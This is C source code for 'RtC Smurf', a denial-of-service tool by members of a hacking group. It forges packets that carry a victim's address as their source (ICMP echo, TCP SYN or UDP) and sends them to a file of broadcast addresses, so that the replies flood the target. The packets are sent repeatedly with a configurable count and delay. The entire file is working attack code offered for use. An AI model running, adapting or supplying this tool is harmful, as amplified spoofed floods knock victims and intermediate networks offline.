/******************************************************************************
 *               rtcsmurf.c by Sly and S/ash (members of RtC)                 *
 *           contain function definitions for the tool RtC Smurf              *
 * RtC      : http://www.rtc.fr.st      --         email : rtc@fr.st          *
 * RtC Tech : http://www.rtctech.fr.st                                        *
 * Sly      : rtcsly@yahoo.fr                                                 *
 * S/ash    : sl4sh@ifrance.com                                               *
 ******************************************************************************/

#include "rtcsmurf.h"


/******************************************************************************
 * Function send_packet - send the correct packet on a host                   *
 * Input  : sock             : raw socket                                     *
 *          from, dest       : sender and destinator                          *
 *          method           : method number                                  *
 *          fport, dport     : ports or packet size                           *
 ******************************************************************************/
void send_packet(int sock, struct sockaddr_in from, struct sockaddr_in dest, int method, long fport, long dport)
{
  fd_set rset;
  char *buf; int i;

  FD_ZERO(&rset);
  FD_SET(sock, &rset);
  /* sending a SYN packet */
  switch(method)
    {
    case 0:
      buf = (char*)malloc(fport);
      for(i=0; i<fport; i++) buf[i] = i;
      icmp_send(sock, &dest, from.sin_addr.s_addr, dest.sin_addr.s_addr,
		8, 0,   /* Echo request */
		random(), 0,
		buf, fport);
      free(buf);
      break;

    case 1:
      dest.sin_port = htons(dport);
      tcp_send(sock,&dest,
	       from.sin_addr.s_addr,dest.sin_addr.s_addr,
	       fport,dport,
	       TH_SYN,  /* SYN packet */
	       lrand48()+1, lrand48(),
	       512,
	       NULL,
	       0);
      break;

    case 2:
      dest.sin_port = htons(dport);
      udp_send(sock,&dest,
	       from.sin_addr.s_addr,dest.sin_addr.s_addr,
	       fport,dport,
	       NULL, 0);
      break;
    }
}

/******************************************************************************
 * Function smurf : send an ack packet to each host in destlist               *
 * Input : from         : target to smurf                                     *
 *         destlist     : broadcast list                                      *
 *         method       : method number                                       *
 *         fport, dport : ports or packet size                                *
 *         delay        : delay between two sending                           *
 ******************************************************************************/
void smurf(struct sockaddr_in from, struct sockaddr_in *destlist, int method, long fport, long dport, int delay)
{
  int sock, rc;
  sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
  if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&rc, sizeof(rc))<0) /* set the socket for making ourselves our ip header */
    {
      fprintf(stderr, IPHDRWRITE_ERROR);
      exit(-1);
    }
  for(rc=0; destlist[rc].sin_addr.s_addr != INADDR_NONE; rc++)
    {
      send_packet(sock, from, destlist[rc], method, fport, dport);
      printf(".");
      fflush(stdout);
      usleep(delay);
    }
  close(sock);
}

/* function for printing syntax string */
void argument(void)
{
  fprintf(stderr, SYNTAXSTR);
  exit(0);
}

/* Now, the main procedure */
int main (int argc, char *argv[])
{
  struct sockaddr_in target;
  FILE *bcastfile;
  long fromport, destport, method;
  int i, delay, packetnb;
  char buf[256];
  struct sockaddr_in *bcastlist;

  /* print for prosterity */
  printf(VERSTR);

  /* argument test */
  if ((argc < 4) || (argc > 8)) argument();

  method = atoi(argv[1]);
  if((method>2) || (method<0)) argument();
  if(method && (argc<6)) argument();

  /* argument parsing */
  i = 3;
  if(method)
    {
      destport = atoi(argv[i++]);
      fromport = atoi(argv[i++]);
    }
  else
    {
      if(!strcmp(argv[i], "-p"))
	{
	  i++;
	  if(i>=argc) argument();
	  destport = atoi(argv[i++]);
	}
      else destport = DEFPACKSIZE;
    }

  packetnb = (i+1)<argc ? atoi(argv[i+1]) : DEFPACKETNB;
  delay    = (i+2)<argc ? atoi(argv[i+2]) : DEFDELAY;
  
  if(i>=argc) argument();

  bcastfile = fopen(argv[i], "r");
  if(!bcastfile)
    {
      fprintf(stderr, CANTOPENFILE_ERROR, argv[4]);
      return -5;
    }

  /* Name resolving */
  printf("Resolving target name...\n");
  target.sin_family = AF_INET;
  target.sin_addr   = resolve(argv[2]);
  if(target.sin_addr.s_addr==INADDR_NONE)
    {
      fprintf(stderr, CANTRESOLVE_ERROR, argv[2]);
      return -1;
    }
  printf(TARGETIP_STR, argv[2], inet_ntoa(target.sin_addr));

  /* Resolving the hosts in the broadcast list */
  printf(RESOLVINGBCL_STR);
  bcastlist = (struct sockaddr_in*)malloc(sizeof(struct sockaddr_in)*100000); /* get 100 000 field (maybe a little to much) */
  if(!bcastlist)
    {
      fprintf(stderr, MEMORY_ERROR);
      return -2;
    }
  printf(ADDED_STR);
  for(i=0; !feof(bcastfile) && (i<100000); i++)
    {
      fgets(buf, 256, bcastfile);
      if(buf[strlen(buf)-1]=='\n') buf[strlen(buf)-1] = 0;
      bcastlist[i].sin_family = AF_INET;
      bcastlist[i].sin_addr   = resolve(buf);
      if(bcastlist[i].sin_addr.s_addr==INADDR_NONE)
	i--;
      else printf(BROADCASTIP_STR, buf,  inet_ntoa(bcastlist[i].sin_addr));
    }
  bcastlist[i].sin_addr.s_addr = INADDR_NONE;
  fclose(bcastfile);

  /* Smurfing turn */
  printf(START_STR);
  fflush(stdout);
  while(packetnb--)
    {
      printf(PACKETNB_STR, packetnb);
      fflush(stdout);
      smurf(target, bcastlist, method, destport, fromport, delay);
    }
  printf(END_STR);
  return 0;
}
